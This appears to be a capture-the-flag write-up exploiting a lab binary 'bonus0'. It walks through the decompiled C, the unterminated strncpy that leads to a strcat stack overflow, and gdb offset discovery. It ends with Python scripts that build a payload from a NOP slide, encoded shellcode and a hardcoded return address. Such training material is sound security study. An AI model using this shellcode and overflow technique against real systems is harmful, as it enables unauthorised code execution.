Let's disassmble `bonus0`:
``` c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

const char *g_message = " - ";
const char g_space = ' ';

void p(char *target_buffer, const char *message)
{
   char temp_buffer[4104];

   puts(message);

   read(0, temp_buffer, 4096);

   *strchr(temp_buffer, 0xa) = '\0';

   strncpy(target_buffer, temp_buffer, 20);
}

void pp(char *buffer0)
{
   char buffer1[20];
   char buffer2[20];

   p(buffer2, g_message);
   p(buffer1, g_message);

   strcpy(buffer0, buffer2);
   buffer0[strlen(buffer0)] = g_space;

   strcat(buffer0, buffer1);
}

int main()
{
   char buffer0[42];

   pp(buffer0);
   puts(buffer0);

   return 0;
}
```

This code is super strange, but let's look for bugs.
This piece looks interesting:
``` c
void p(char *target_buffer, const char *message)
{
   char temp_buffer[4104];
   ...
   strncpy(target_buffer, temp_buffer, 20);
}

void pp(char *buffer0)
{
   char buffer1[20];
   ...
   p(buffer1, g_message);
   ...
}
```

We have some string `temp_buffer` with length 4014 and a string `buffer1` with length 20.
Then we copy at most 20 character from `temp_buffer` into `buffer1`.

However, what if `temp_buffer` will have all 20 characters?
This means that we will copy them all and don't copy zero terminator.
That's a bug.

Let's think how it may help us.
Let's inspect this code:
``` c
   strcpy(buffer0, buffer2);
   buffer0[strlen(buffer0)] = g_space;
   strcat(buffer0, buffer1);
```

Firstly, we copy `buffer2` into `buffer0` (`buffer2` may be not null-terminated).
Secondly, we append `buffer1` to `buffer0` (`buffer1` may be not null-terminated).
Because both `buffer1` and `buffer2` may be non-null-terminated we can overflow `buffer0`!

Firstly, we need to find bytes that affect return address of `main`:
``` shell
$ gdb bonus0 
(gdb) r       
Starting program: /home/user/bonus0/bonus0 
 - 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHKKKKLLLL
 - 
0000111122223333444455556666777788889999
AAAABBBBCCCCDDDDEEEE00001111222233334444??? 00001111222233334444???

Program received signal SIGSEGV, Segmentation fault.
0x33323232 in ?? ()
```

We see that characters `22223333` affect the return address.

Next we need to paste some shellcode.
I'm storing the shell code on the stack frame of `p` function inside `temp_buffer` string.
``` python
import sys

nop_slide = '\x90' * 256

shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80" \
            "\x6c\x0e\xff\x01\x80\xe9\x01\x75" \
            "\xf6\xeb\x05\xe8\xea\xff\xff\xff" \
            "\x32\xc1\x51\x69\x30\x30\x74\x69" \
            "\x69\x30\x63\x6a\x6f\x8a\xe4\x51" \
            "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

#0xbfffe6f0
shellcode_address = '\xf0\xe6\xff\xbf'

print('AAABBBBCCCCDDDDEEEEFFFFGGGGHHHHKKKKLLLL')
print('000111122%s33444455556666777788889999%s%s' % (shellcode_address, nop_slide, shellcode))
```

This almost works.
Last thing we have to do is overcome two `read`s:
if we pass output of above Python script to `bonus0` it will read all text in first `read` (see `p`) call and second will read 0 bytes.

To resolve this I've decided to pad both strings until they are 4096 length.
This way `read`s will retrieve both strings correctly.
*Also I use `sys.stdout.write` instead of `print` to discard newlines.*

``` python
import sys

def pad_to_4096(str):
        return str + '\x01' * (4096 - 1 - len(str)) + '\x0a'

nop_slide = '\x90' * 256

shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80" \
            "\x6c\x0e\xff\x01\x80\xe9\x01\x75" \
            "\xf6\xeb\x05\xe8\xea\xff\xff\xff" \
            "\x32\xc1\x51\x69\x30\x30\x74\x69" \
            "\x69\x30\x63\x6a\x6f\x8a\xe4\x51" \
            "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

#0xbfffe6f0
shellcode_address = '\xf0\xe6\xff\xbf'

sys.stdout.write(pad_to_4096('AAABBBBCCCCDDDDEEEEFFFFGGGGHHHHKKKKLLLL'))
sys.stdout.write(pad_to_4096('000111122%s33444455556666777788889999%s%s' % (shellcode_address, nop_slide, shellcode)))
```